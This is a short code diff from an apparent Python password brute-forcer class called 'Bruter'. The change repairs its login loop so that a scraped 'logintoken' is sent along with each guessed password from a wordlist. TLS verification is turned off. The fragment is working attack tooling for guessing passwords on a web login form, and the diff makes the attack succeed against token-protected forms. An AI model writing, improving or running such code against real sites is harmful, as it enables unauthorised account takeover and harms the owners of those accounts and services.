@@ -28,16 +28,16 @@ class Bruter():
                     },
                     verify=False
                 )
-            try:
-                regex = re.search('name="logintoken" value="(.*?)"', req.text).group(1) 
-                post_data['logintoken'] = str(regex)
-            except:
-                pass
             post_data = {
                 'anchor': '',
                 'username': str(self.uname),
                 'password': str(words)
             }
+            try:
+                regex = re.search('name="logintoken" value="(.*?)"', req.text).group(1) 
+                post_data['logintoken'] = str(regex)
+            except:
+                pass
             post = ses.post(self.webUrl,
                     headers={
                         'User-Agent': self.ua
